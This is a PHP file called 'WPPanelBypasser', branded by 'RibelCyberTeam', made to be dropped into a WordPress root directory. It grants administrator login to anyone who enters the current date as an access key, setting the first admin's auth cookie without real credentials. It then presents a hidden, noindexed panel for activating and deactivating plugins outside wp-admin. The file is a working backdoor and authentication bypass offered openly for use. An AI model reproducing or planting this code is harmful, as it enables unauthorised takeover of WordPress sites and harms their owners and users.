<?php
ob_start();
error_reporting(0);

// ========== CONFIG ==========
$today          = date('dm');
$password_valid = false;
$msg            = '';
$msg_type       = 'error';
$plugin_list    = [];
$wp_loaded      = false;

// ========== HELPERS ==========
function rct_esc($v) { return htmlspecialchars((string) $v, ENT_QUOTES, 'UTF-8'); }
function rct_js($v)  { return htmlspecialchars((string) $v, ENT_QUOTES, 'UTF-8'); }

function rct_bootstrap() {
    static $loaded = false;
    if ($loaded) return true;
    $wp_load = __DIR__ . '/wp-load.php';
    if (!is_file($wp_load)) return false;
    require_once $wp_load;
    $loaded = true;
    return true;
}

function rct_all_plugins() {
    if (!function_exists('get_plugins')) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }
    return get_plugins();
}

function rct_plugin_status($plugin_file) {
    if (!function_exists('is_plugin_active')) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }
    return is_plugin_active($plugin_file);
}

function rct_activate($plugin_file) {
    if (!function_exists('activate_plugin')) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }
    return activate_plugin($plugin_file, '', false, true);
}

function rct_deactivate($plugin_file) {
    if (!function_exists('deactivate_plugins')) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }
    deactivate_plugins($plugin_file, '', false, true);
}

if (isset($_GET['logout'])) {
    setcookie('rct_unlock', '', time() - 3600, '/');
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// ========== BOOTSTRAP WP ONCE ==========
$wp_loaded = rct_bootstrap();

// ---- session unlock cookie check ----
if (!$password_valid && isset($_COOKIE['rct_unlock'])) {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $expected = hash('sha256', $today . '|' . $ua);
    if (hash_equals($expected, $_COOKIE['rct_unlock'])) {
        $password_valid = true;
    }
}

// ========== HANDLE PLUGIN ACTION ==========
if ($wp_loaded && $password_valid && isset($_POST['plugin_action'], $_POST['plugin_file'])) {
    $plugin_file = wp_unslash($_POST['plugin_file']);
    $action      = wp_unslash($_POST['plugin_action']);

    if ($action === 'activate') {
        $result = rct_activate($plugin_file);
        if (is_wp_error($result)) {
            $msg      = 'Activation failed · ' . $result->get_error_message();
            $msg_type = 'error';
        } else {
            $msg      = 'Plugin activated · ' . $plugin_file;
            $msg_type = 'ok';
        }
    } elseif ($action === 'deactivate') {
        rct_deactivate($plugin_file);
        $msg      = 'Plugin deactivated · ' . $plugin_file;
        $msg_type = 'warn';
    }
}

// ========== HANDLE LOGIN ==========
if ($wp_loaded && isset($_POST['login'], $_POST['password'])) {
    if ($_POST['password'] === $today) {
        $password_valid = true;

        $user_query = new WP_User_Query(['role' => 'Administrator']);
        if (!empty($user_query->results)) {
            $admin = $user_query->results[0];
            $user  = get_user_by('id', $admin->ID);

            if ($user) {
                wp_set_current_user($user->ID, $user->user_login);
                wp_set_auth_cookie($user->ID, false, is_ssl());
                do_action('wp_login', $user->user_login, $user);
                $msg      = 'Signed in as ' . $user->user_login . '. Open the dashboard to continue.';
                $msg_type = 'ok';
                $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
                // setcookie() array-options form needs PHP 7.3+ — use legacy signature
                $cookie_val = hash('sha256', $today . '|' . $ua);
                $expire     = time() + 3600;
                // PHP 5.x has no samesite param in setcookie; emit the header manually
                $cookie_header = 'rct_unlock=' . rawurlencode($cookie_val)
                    . '; expires=' . gmdate('D, d-M-Y H:i:s', $expire) . ' GMT'
                    . '; Max-Age=3600; path=/; HttpOnly; SameSite=Strict'
                    . (is_ssl() ? '; Secure' : '');
                header('Set-Cookie: ' . $cookie_header, false);
            } else {
                $msg      = 'Administrator user could not be loaded.';
                $msg_type = 'error';
            }
        } else {
            $msg      = 'No administrator users found on this install.';
            $msg_type = 'error';
        }
    } else {
        $msg      = 'Invalid access key.';
        $msg_type = 'error';
    }
}

// ========== LOAD PLUGIN LIST ==========
if ($wp_loaded) {
    foreach (rct_all_plugins() as $plugin_file => $plugin_data) {
        $plugin_list[] = [
            'file'    => $plugin_file,
            'name'    => $plugin_data['Name'] ? $plugin_data['Name'] : $plugin_file,
            'version' => $plugin_data['Version'] ? $plugin_data['Version'] : '—',
            'status'  => rct_plugin_status($plugin_file) ? 'active' : 'inactive',
        ];
    }
    usort($plugin_list, function ($a, $b) { return strcasecmp($a['name'], $b['name']); });
}

$total          = count($plugin_list);
$active_count   = count(array_filter($plugin_list, function ($p) { return $p['status'] === 'active'; }));
$inactive_count = $total - $active_count;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>WPPanelBypasser | RibelCyberTeam</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<script src="https://unpkg.com/lucide@0.468.0/dist/umd/lucide.min.js" defer></script>
<style>
:root{
  color-scheme:dark;
  --bg:#08090c;
  --bg-grad-1:radial-gradient(1200px 600px at 15% -10%, rgba(99,102,241,.14), transparent 60%);
  --bg-grad-2:radial-gradient(900px 500px at 100% 10%, rgba(56,189,248,.08), transparent 55%);
  --surface:rgba(22,24,30,.62);
  --surface-2:rgba(30,33,42,.55);
  --surface-3:rgba(40,44,56,.5);
  --stroke:rgba(255,255,255,.075);
  --stroke-strong:rgba(255,255,255,.14);
  --text:#eef1f6;
  --muted:#8a93a6;
  --dim:#5f6879;
  --accent:#8b95ff;
  --accent-2:#7bd3ff;
  --ok:#7ee2b8;
  --ok-bg:rgba(58,183,132,.14);
  --warn:#ffc178;
  --warn-bg:rgba(255,165,74,.14);
  --err:#ff9a9a;
  --err-bg:rgba(255,90,90,.14);
  --radius:16px;
  --radius-sm:12px;
  --blur:22px;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;
  color:var(--text);
  font-family:'Inter',system-ui,-apple-system,sans-serif;
  font-size:14px;
  background:var(--bg);
  background-image:var(--bg-grad-1),var(--bg-grad-2);
  background-attachment:fixed;
  -webkit-font-smoothing:antialiased;
  min-height:100vh;
}
button,input{font:inherit;color:inherit}
button{cursor:pointer;border:0;background:none}
a{color:inherit;text-decoration:none}
.mono{font-family:'JetBrains Mono',ui-monospace,monospace}

.shell{min-height:100vh;display:grid;grid-template-columns:262px minmax(0,1fr)}

.side{
  position:sticky;top:0;align-self:start;
  height:100vh;
  padding:26px 18px;
  display:flex;flex-direction:column;gap:26px;
  border-right:1px solid var(--stroke);
  background:linear-gradient(180deg,rgba(14,16,22,.85),rgba(12,14,20,.62));
  backdrop-filter:blur(var(--blur));
  -webkit-backdrop-filter:blur(var(--blur));
}
.brand{display:flex;align-items:center;gap:12px;padding:4px 10px 0}
.brand-mark{
  width:40px;height:40px;border-radius:12px;
  display:grid;place-items:center;
  background:linear-gradient(140deg,#8b95ff,#7bd3ff);
  color:#0a0b10;
  box-shadow:0 8px 30px -10px rgba(139,149,255,.65);
}
.brand-mark svg{width:20px;height:20px}
.brand-text strong{display:block;font-weight:700;font-size:14px;letter-spacing:-.1px}
.brand-text span{display:block;font-size:10px;color:var(--dim);letter-spacing:.18em;margin-top:3px;text-transform:uppercase}
.nav-label{font-size:10px;font-weight:600;letter-spacing:.2em;color:var(--dim);padding:0 12px;margin-bottom:10px;text-transform:uppercase}
.nav{display:grid;gap:4px}
.nav a{
  display:flex;align-items:center;gap:12px;
  padding:11px 12px;border-radius:10px;
  color:var(--muted);font-weight:500;font-size:13px;
  border:1px solid transparent;
  transition:background .15s ease,color .15s ease,border-color .15s ease;
}
.nav a svg{width:17px;height:17px;flex:0 0 auto;stroke-width:1.9}
.nav a:hover{background:rgba(255,255,255,.035);color:var(--text)}
.nav a.active{
  background:linear-gradient(180deg,rgba(139,149,255,.16),rgba(139,149,255,.06));
  border-color:rgba(139,149,255,.28);
  color:#cbd2ff;
}
.nav a.active svg{color:var(--accent)}
.spacer{flex:1}
.side-card{
  border:1px solid var(--stroke);
  background:var(--surface-2);
  border-radius:14px;
  padding:14px 14px 15px;
  backdrop-filter:blur(14px);
  -webkit-backdrop-filter:blur(14px);
}
.side-card .row{display:flex;align-items:center;gap:8px;color:#c8d0e2;font-weight:600;font-size:12px;margin-bottom:8px}
.side-card .row svg{width:15px;height:15px;color:var(--accent-2)}
.side-card p{margin:0;font-size:11.5px;line-height:1.6;color:var(--muted)}

.main{min-width:0;padding:32px clamp(22px,3.4vw,56px) 56px;max-width:1660px;width:100%;margin:0 auto}
.topbar{display:flex;align-items:center;justify-content:space-between;gap:16px;padding-bottom:26px}
.crumb{display:flex;align-items:center;gap:8px;color:var(--dim);font-size:12.5px}
.crumb svg{width:12px;height:12px}
.crumb b{color:#cdd4e2;font-weight:600}
.top-actions{display:flex;align-items:center;gap:10px}
.avatar{
  width:36px;height:36px;
  border-radius:50%;
  overflow:hidden;
  border:1px solid var(--stroke-strong);
  flex:0 0 auto;
  background-image:url('https://i.giphy.com/GOHONjvYJFkUJF3bg4.webp');
  background-size:25px 25px;
  background-repeat:repeat;
  background-position:top left;
  image-rendering:auto;
  animation:avatar-tile 6s linear infinite;
}
@keyframes avatar-tile{
  from{background-position:0 0}
  to{background-position:14px 14px}
}

.headline{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin-bottom:30px;flex-wrap:wrap}
.eyebrow{
  display:inline-flex;align-items:center;gap:8px;
  font-size:10.5px;font-weight:600;letter-spacing:.2em;text-transform:uppercase;
  color:var(--accent);margin-bottom:12px;
}
.eyebrow:before{content:'';width:16px;height:1px;background:var(--accent);opacity:.6}
.headline h1{margin:0 0 8px;font-size:clamp(26px,3vw,36px);line-height:1.15;letter-spacing:-1px;font-weight:700}
.headline p{margin:0;color:var(--muted);font-size:13.5px;line-height:1.65;max-width:56ch}

.alert{
  display:flex;align-items:center;gap:10px;
  padding:13px 16px;border-radius:12px;
  font-size:13px;font-weight:500;
  margin-bottom:22px;
  border:1px solid var(--stroke-strong);
  background:var(--surface-2);
  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
}
.alert svg{width:16px;height:16px;flex:0 0 auto}
.alert.ok{background:var(--ok-bg);border-color:rgba(126,226,184,.28);color:#bff0da}
.alert.ok svg{color:var(--ok)}
.alert.warn{background:var(--warn-bg);border-color:rgba(255,193,120,.28);color:#ffe0b3}
.alert.warn svg{color:var(--warn)}
.alert.error{background:var(--err-bg);border-color:rgba(255,154,154,.28);color:#ffd0d0}
.alert.error svg{color:var(--err)}

.stats{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px;margin-bottom:22px}
.stat{
  position:relative;
  border:1px solid var(--stroke);
  background:var(--surface);
  border-radius:var(--radius);
  padding:20px 22px;
  backdrop-filter:blur(var(--blur));
  -webkit-backdrop-filter:blur(var(--blur));
  overflow:hidden;
}
.stat:before{
  content:'';position:absolute;inset:0;
  background:linear-gradient(140deg,rgba(255,255,255,.045),transparent 55%);
  pointer-events:none;
}
.stat-top{display:flex;align-items:center;justify-content:space-between}
.stat-label{color:var(--muted);font-size:12px;font-weight:500;letter-spacing:.02em}
.stat-ico{
  width:32px;height:32px;border-radius:10px;
  display:grid;place-items:center;
  background:rgba(139,149,255,.12);
  border:1px solid rgba(139,149,255,.22);
  color:var(--accent);
}
.stat-ico svg{width:16px;height:16px;stroke-width:2}
.stat:nth-child(2) .stat-ico{background:rgba(126,226,184,.12);border-color:rgba(126,226,184,.22);color:var(--ok)}
.stat:nth-child(3) .stat-ico{background:rgba(255,193,120,.12);border-color:rgba(255,193,120,.22);color:var(--warn)}
.stat-value{font-size:34px;font-weight:700;letter-spacing:-1.2px;margin:16px 0 4px;line-height:1}
.stat-sub{color:var(--dim);font-size:11.5px}

.panel{
  border:1px solid var(--stroke);
  background:var(--surface);
  border-radius:var(--radius);
  backdrop-filter:blur(var(--blur));
  -webkit-backdrop-filter:blur(var(--blur));
  overflow:hidden;
}
.panel-head{
  padding:22px 24px 18px;
  display:flex;align-items:center;justify-content:space-between;
  gap:12px;border-bottom:1px solid var(--stroke);
}
.panel-head h2{margin:0 0 5px;font-size:16px;font-weight:600;letter-spacing:-.2px}
.panel-head p{margin:0;color:var(--muted);font-size:12.5px}
.count-pill{
  display:inline-flex;align-items:center;gap:6px;
  padding:6px 11px;border-radius:100px;
  background:var(--surface-3);
  border:1px solid var(--stroke-strong);
  color:#c5cdde;font-size:11.5px;font-weight:600;
}

.tools{display:flex;gap:10px;padding:16px 24px 14px;align-items:center;flex-wrap:wrap}
.search{position:relative;flex:1;min-width:220px}
.search svg{
  position:absolute;left:13px;top:50%;transform:translateY(-50%);
  width:15px;height:15px;color:var(--dim);pointer-events:none;
}
.search input{
  width:100%;
  background:rgba(10,12,18,.55);
  border:1px solid var(--stroke-strong);
  border-radius:10px;
  padding:11px 13px 11px 38px;
  color:var(--text);
  outline:none;
  transition:border-color .15s ease,box-shadow .15s ease,background .15s ease;
}
.search input::placeholder{color:var(--dim)}
.search input:focus{
  border-color:rgba(139,149,255,.55);
  background:rgba(10,12,18,.75);
  box-shadow:0 0 0 4px rgba(139,149,255,.12);
}
.filters{display:flex;gap:6px}
.filter{
  padding:10px 14px;border-radius:10px;
  background:var(--surface-3);
  border:1px solid var(--stroke);
  color:var(--muted);font-size:12px;font-weight:600;
  transition:all .15s ease;
}
.filter:hover{color:var(--text);border-color:var(--stroke-strong)}
.filter.active{
  background:linear-gradient(180deg,rgba(139,149,255,.2),rgba(139,149,255,.08));
  border-color:rgba(139,149,255,.4);
  color:#d5daff;
  box-shadow:0 0 0 1px rgba(139,149,255,.15),0 6px 22px -12px rgba(139,149,255,.7);
}

.table-wrap{overflow-x:auto;padding:0 4px 4px}
table{width:100%;border-collapse:separate;border-spacing:0;min-width:700px}
thead th{
  text-align:left;
  padding:12px 24px;
  font-size:10.5px;font-weight:600;letter-spacing:.16em;text-transform:uppercase;
  color:var(--dim);
  border-bottom:1px solid var(--stroke);
}
tbody td{padding:16px 24px;border-bottom:1px solid var(--stroke);vertical-align:middle}
tbody tr{transition:background .15s ease}
tbody tr:last-child td{border-bottom:0}
tbody tr:hover{background:rgba(255,255,255,.025)}

.p-name{font-weight:600;font-size:13.5px;color:#e6ebf3}
.p-file{
  display:inline-flex;align-items:center;gap:6px;
  margin-top:6px;font-size:11px;color:var(--dim);
  font-family:'JetBrains Mono',monospace;
  max-width:360px;overflow-wrap:anywhere;
}
.p-file svg{width:11px;height:11px;flex:0 0 auto}
.p-ver{font-size:12px;color:var(--muted);font-family:'JetBrains Mono',monospace}

.status{
  display:inline-flex;align-items:center;gap:7px;
  padding:5px 11px;border-radius:100px;
  font-size:10.5px;font-weight:700;letter-spacing:.08em;
  border:1px solid transparent;
}
.status:before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
.status.on{color:var(--ok);background:var(--ok-bg);border-color:rgba(126,226,184,.28)}
.status.off{color:#a4adc0;background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.1)}

.act-btn{
  display:inline-flex;align-items:center;gap:7px;
  padding:8px 13px;border-radius:9px;
  font-size:12px;font-weight:600;
  border:1px solid transparent;
  transition:all .15s ease;
  white-space:nowrap;
}
.act-btn svg{width:13px;height:13px;stroke-width:2.2}
.act-btn.on{background:rgba(139,149,255,.14);border-color:rgba(139,149,255,.32);color:#c8cfff}
.act-btn.on:hover{background:rgba(139,149,255,.24);border-color:rgba(139,149,255,.5)}
.act-btn.off{background:rgba(255,193,120,.1);border-color:rgba(255,193,120,.28);color:#ffd6a4}
.act-btn.off:hover{background:rgba(255,193,120,.2);border-color:rgba(255,193,120,.5)}

.empty{padding:44px 24px;text-align:center;color:var(--dim);font-size:13px}

.foot{
  display:flex;justify-content:space-between;gap:12px;
  padding:24px 4px 0;color:var(--dim);font-size:11.5px;flex-wrap:wrap;
}
.foot svg{width:12px;height:12px;vertical-align:-2px;margin-right:5px}

.login-wrap{min-height:100vh;display:grid;place-items:center;padding:30px}
.login-card{
  width:100%;max-width:420px;
  border:1px solid var(--stroke);
  background:var(--surface);
  border-radius:20px;
  padding:34px 32px 30px;
  backdrop-filter:blur(24px);
  -webkit-backdrop-filter:blur(24px);
  box-shadow:0 30px 80px -30px rgba(0,0,0,.8),0 0 0 1px rgba(255,255,255,.02) inset;
  position:relative;overflow:hidden;
}
.login-card:before{
  content:'';position:absolute;top:-50%;right:-50%;width:200%;height:200%;
  background:radial-gradient(circle at 70% 20%,rgba(139,149,255,.1),transparent 40%);
  pointer-events:none;
}
.login-brand{display:flex;align-items:center;gap:12px;margin-bottom:26px}
.login-brand .brand-mark{width:44px;height:44px;border-radius:13px}
.login-brand strong{font-size:15px;font-weight:700;display:block;letter-spacing:-.1px}
.login-brand span{display:block;font-size:10.5px;color:var(--dim);letter-spacing:.16em;text-transform:uppercase;margin-top:4px}
.login-card h1{margin:0 0 8px;font-size:22px;font-weight:700;letter-spacing:-.4px}
.login-card > p{margin:0 0 24px;color:var(--muted);font-size:13px;line-height:1.6}
.field{display:grid;gap:8px;margin-bottom:18px;position:relative;z-index:1}
.field label{font-size:11.5px;font-weight:600;color:#b8c0d2;letter-spacing:.03em}
.field input{
  width:100%;background:rgba(10,12,18,.7);
  border:1px solid var(--stroke-strong);
  border-radius:11px;
  padding:13px 14px;color:var(--text);outline:none;
  transition:border-color .15s ease,box-shadow .15s ease;
  font-family:'JetBrains Mono',monospace;letter-spacing:.08em;
}
.field input:focus{
  border-color:rgba(139,149,255,.6);
  box-shadow:0 0 0 4px rgba(139,149,255,.14);
}
.btn-primary{
  width:100%;
  display:inline-flex;align-items:center;justify-content:center;gap:9px;
  padding:13px 16px;border-radius:11px;
  background:linear-gradient(140deg,#8b95ff,#7bd3ff);
  color:#0a0b10;font-weight:700;font-size:13.5px;
  letter-spacing:.01em;
  box-shadow:0 10px 30px -12px rgba(139,149,255,.7);
  transition:transform .12s ease,box-shadow .15s ease,filter .15s ease;
  position:relative;z-index:1;
}
.btn-primary:hover{filter:brightness(1.06);box-shadow:0 14px 36px -12px rgba(139,149,255,.85)}
.btn-primary:active{transform:translateY(1px)}
.btn-primary svg{width:15px;height:15px;stroke-width:2.4}
.btn-ghost{
  width:100%;margin-top:10px;
  display:inline-flex;align-items:center;justify-content:center;gap:8px;
  padding:12px;border-radius:11px;
  background:var(--surface-3);
  border:1px solid var(--stroke-strong);
  color:#c5cdde;font-size:13px;font-weight:600;
  transition:all .15s ease;
}
.btn-ghost:hover{background:rgba(255,255,255,.06);color:var(--text)}
.btn-ghost svg{width:14px;height:14px}
.login-meta{
  margin-top:20px;padding-top:18px;
  border-top:1px solid var(--stroke);
  display:grid;grid-template-columns:1fr 1fr;gap:10px 18px;
  font-size:11px;
}
.login-meta .k{color:var(--dim);display:block;margin-bottom:3px;letter-spacing:.05em;text-transform:uppercase;font-size:10px}
.login-meta .v{color:#b8c0d2;font-family:'JetBrains Mono',monospace}

@media(max-width:1000px){
  .shell{grid-template-columns:78px minmax(0,1fr)}
  .side{padding:22px 12px}
  .brand{padding:0;justify-content:center}
  .brand-text,.nav-label,.nav a span,.side-card{display:none}
  .nav a{justify-content:center;padding:13px}
  .main{padding:26px clamp(18px,3vw,32px) 40px}
}
@media(max-width:760px){
  .stats{grid-template-columns:1fr}
  .headline h1{font-size:26px}
  .tools{flex-direction:column;align-items:stretch}
  .filters{width:100%}
  .filter{flex:1;text-align:center}
  .panel-head{flex-direction:column;align-items:flex-start;gap:10px}
}
@media(max-width:560px){
  .shell{display:block}
  .side{position:static;height:auto;flex-direction:row;align-items:center;gap:8px;padding:14px 16px;overflow-x:auto}
  .side .brand{margin-right:8px}
  .nav{display:flex;gap:6px}
  .nav-label,.spacer,.side-card{display:none}
  .main{padding:20px 16px 30px}
  .crumb{flex:1}
}
</style>
</head>
<body>

<?php if (!$wp_loaded): ?>
<div class="login-wrap">
  <div class="login-card">
    <div class="login-brand">
      <div class="brand-mark"><i data-lucide="hexagon"></i></div>
      <div><strong>WPPanelBypasser</strong><span>RibelCyberTeam</span></div>
    </div>
    <h1>WordPress not found</h1>
    <p>Place this file in the WordPress root directory, next to <code>wp-load.php</code>.</p>
  </div>
</div>

<?php elseif (!$password_valid): ?>
<div class="login-wrap">
  <div class="login-card">
    <div class="login-brand">
      <div class="brand-mark"><i data-lucide="hexagon"></i></div>
      <div><strong>WPPanelBypasser</strong><span>RibelCyberTeam</span></div>
    </div>
    <h1>Sign in to WPPanelBypasser</h1>
    <p>Enter the access key to open the plugin control panel.</p>

    <?php if ($msg): ?>
      <div class="alert <?php echo rct_esc($msg_type); ?>">
        <i data-lucide="<?php echo $msg_type === 'ok' ? 'check-circle-2' : ($msg_type === 'warn' ? 'alert-triangle' : 'x-circle'); ?>"></i>
        <?php echo rct_esc($msg); ?>
      </div>
    <?php endif; ?>

    <?php if ($msg_type === 'ok' && strpos($msg, 'Signed in') === 0): ?>
      <a href="<?php echo rct_esc(site_url('/wp-admin/index.php')); ?>" class="btn-primary" style="margin-bottom:10px">
        <i data-lucide="layout-dashboard"></i> Open Dashboard
      </a>
      <a href="?" class="btn-ghost">
        <i data-lucide="rotate-ccw"></i> Back to workspace
      </a>
    <?php else: ?>
      <form method="post" autocomplete="off">
        <div class="field">
          <label for="UserPassword">Access key</label>
          <input id="UserPassword" name="password" type="password" placeholder="••••" autofocus>
        </div>
        <button type="submit" name="login" value="1" class="btn-primary">
          <i data-lucide="arrow-right"></i> Login
        </button>
      </form>
    <?php endif; ?>

    <div class="login-meta">
      <div><span class="k">Server time</span><span class="v"><?php echo rct_esc(date('d-m-Y H:i')); ?></span></div>
      <div><span class="k">PHP</span><span class="v"><?php echo rct_esc(phpversion()); ?></span></div>
    </div>
  </div>
</div>
<script>window.addEventListener('DOMContentLoaded',()=>{if(window.lucide)lucide.createIcons();});</script>

<?php else: ?>
<div class="shell">
  <aside class="side">
    <div class="brand">
      <div class="brand-mark"><i data-lucide="hexagon"></i></div>
      <div class="brand-text">
        <strong>WPPanelBypasser</strong>
        <span>RibelCyberTeam</span>
      </div>
    </div>

    <div>
      <div class="nav-label">Workspace</div>
      <nav class="nav">
        <a class="active" href="#overview"><i data-lucide="layout-dashboard"></i><span>Overview</span></a>
        <a href="#plugins"><i data-lucide="puzzle"></i><span>Plugin Manager</span></a>
        <a href="<?php echo rct_esc(site_url('/wp-admin/index.php')); ?>"><i data-lucide="external-link"></i><span>WP Admin</span></a>
        <a href="?logout=1"><i data-lucide="log-out"></i><span>Logout</span></a>
      </nav>
    </div>

    <div class="spacer"></div>

    <div class="side-card">
      <div class="row"><i data-lucide="key-round"></i> Shared-key session</div>
      <p>Workspace unlocked with the daily access key. No WordPress user attached.</p>
    </div>
  </aside>

  <main class="main" id="overview">
    <div class="topbar">
      <div class="crumb">
        Workspace <i data-lucide="chevron-right"></i> <b>Overview</b>
      </div>
      <div class="top-actions">
        <a href="<?php echo rct_esc(site_url('/wp-admin/index.php')); ?>" class="btn-primary" style="width:auto;padding:10px 16px;font-size:13px">
          <i data-lucide="layout-dashboard"></i> Open Dashboard
        </a>
        <div class="avatar"></div>
      </div>
    </div>

    <div class="headline">
      <div>
        <div class="eyebrow">Control center</div>
        <h1>Plugin Management</h1>
        <p>Activate, deactivate and inspect every plugin installed on this WordPress site - from a single workspace, without logging into wp-admin.</p>
      </div>
    </div>

    <?php if ($msg): ?>
      <div class="alert <?php echo rct_esc($msg_type); ?>">
        <i data-lucide="<?php echo $msg_type === 'ok' ? 'check-circle-2' : ($msg_type === 'warn' ? 'alert-triangle' : 'x-circle'); ?>"></i>
        <?php echo rct_esc($msg); ?>
      </div>
    <?php endif; ?>

    <section class="stats">
      <div class="stat">
        <div class="stat-top"><span class="stat-label">Total plugins</span><span class="stat-ico"><i data-lucide="boxes"></i></span></div>
        <div class="stat-value"><?php echo (int) $total; ?></div>
        <div class="stat-sub">Installed on this site</div>
      </div>
      <div class="stat">
        <div class="stat-top"><span class="stat-label">Active</span><span class="stat-ico"><i data-lucide="check-circle-2"></i></span></div>
        <div class="stat-value"><?php echo (int) $active_count; ?></div>
        <div class="stat-sub">Currently running</div>
      </div>
      <div class="stat">
        <div class="stat-top"><span class="stat-label">Inactive</span><span class="stat-ico"><i data-lucide="circle-pause"></i></span></div>
        <div class="stat-value"><?php echo (int) $inactive_count; ?></div>
        <div class="stat-sub">Not loaded</div>
      </div>
    </section>

    <section class="panel" id="plugins">
      <div class="panel-head">
        <div>
          <h2>Installed plugins</h2>
          <p>Every plugin available on this WordPress installation.</p>
        </div>
        <span class="count-pill" id="visibleCount"><i data-lucide="puzzle" style="width:12px;height:12px"></i> <?php echo (int) $total; ?> plugins</span>
      </div>

      <div class="tools">
        <div class="search">
          <i data-lucide="search"></i>
          <input id="searchPlugin" type="search" autocomplete="off" placeholder="Search by plugin name or file…">
        </div>
        <div class="filters">
          <button type="button" class="filter active" data-filter="all">All</button>
          <button type="button" class="filter" data-filter="active">Active</button>
          <button type="button" class="filter" data-filter="inactive">Inactive</button>
        </div>
      </div>

      <div class="table-wrap">
        <?php if (empty($plugin_list)): ?>
          <div class="alert error" style="margin:16px 24px 22px">
            <i data-lucide="alert-triangle"></i>
            No plugins found on this installation.
          </div>
        <?php else: ?>
          <table id="pluginTable">
            <thead>
              <tr>
                <th>Plugin</th>
                <th style="width:110px">Version</th>
                <th style="width:130px">Status</th>
                <th style="width:160px">Action</th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($plugin_list as $p):
                $is_active = $p['status'] === 'active';
              ?>
              <tr data-status="<?php echo $is_active ? 'active' : 'inactive'; ?>" data-search="<?php echo rct_esc(strtolower($p['name'] . ' ' . $p['file'])); ?>">
                <td>
                  <div class="p-name"><?php echo rct_esc($p['name']); ?></div>
                  <div class="p-file"><i data-lucide="file-code-2"></i> <?php echo rct_esc($p['file']); ?></div>
                </td>
                <td class="p-ver">v<?php echo rct_esc($p['version']); ?></td>
                <td>
                  <span class="status <?php echo $is_active ? 'on' : 'off'; ?>">
                    <?php echo $is_active ? 'ACTIVE' : 'INACTIVE'; ?>
                  </span>
                </td>
                <td>
                  <?php if ($is_active): ?>
                    <form method="post" style="display:inline">
                      <input type="hidden" name="plugin_file" value="<?php echo rct_esc($p['file']); ?>">
                      <input type="hidden" name="plugin_action" value="deactivate">
                      <button type="submit" class="act-btn off" onclick="return confirm('Deactivate <?php echo rct_js($p['name']); ?>?')">
                        <i data-lucide="power"></i> Deactivate
                      </button>
                    </form>
                  <?php else: ?>
                    <form method="post" style="display:inline">
                      <input type="hidden" name="plugin_file" value="<?php echo rct_esc($p['file']); ?>">
                      <input type="hidden" name="plugin_action" value="activate">
                      <button type="submit" class="act-btn on" onclick="return confirm('Activate <?php echo rct_js($p['name']); ?>?')">
                        <i data-lucide="play"></i> Activate
                      </button>
                    </form>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
          <div class="empty" id="emptyState" hidden>No plugins match your search.</div>
        <?php endif; ?>
      </div>
    </section>

    <div class="foot">
      <span><i data-lucide="shield-check"></i> WPPanelBypasser · Free To Use</span>
      <span>@RibelCyberTeam · <?php echo rct_esc(date('Y')); ?></span>
    </div>
  </main>
</div>

<script>
document.addEventListener('DOMContentLoaded', function () {
  if (window.lucide) lucide.createIcons();

  const search = document.getElementById('searchPlugin');
  const rows = Array.from(document.querySelectorAll('#pluginTable tbody tr'));
  const countEl = document.getElementById('visibleCount');
  const emptyEl = document.getElementById('emptyState');
  const filters = Array.from(document.querySelectorAll('[data-filter]'));
  let state = 'all';

  function update() {
    const q = (search.value || '').toLowerCase().trim();
    let visible = 0;
    rows.forEach(r => {
      const show = (state === 'all' || r.dataset.status === state) &&
                   r.dataset.search.indexOf(q) > -1;
      r.hidden = !show;
      if (show) visible++;
    });
    if (countEl) countEl.innerHTML = '<i data-lucide="puzzle" style="width:12px;height:12px"></i> ' + visible + ' plugins';
    if (emptyEl) emptyEl.hidden = visible !== 0;
    if (window.lucide) lucide.createIcons();
  }

  if (search) search.addEventListener('input', update);
  filters.forEach(btn => btn.addEventListener('click', () => {
    state = btn.dataset.filter;
    filters.forEach(b => b.classList.toggle('active', b === btn));
    update();
  }));
});
</script>
<?php endif; ?>

</body>
</html>
<?php ob_end_flush(); ?>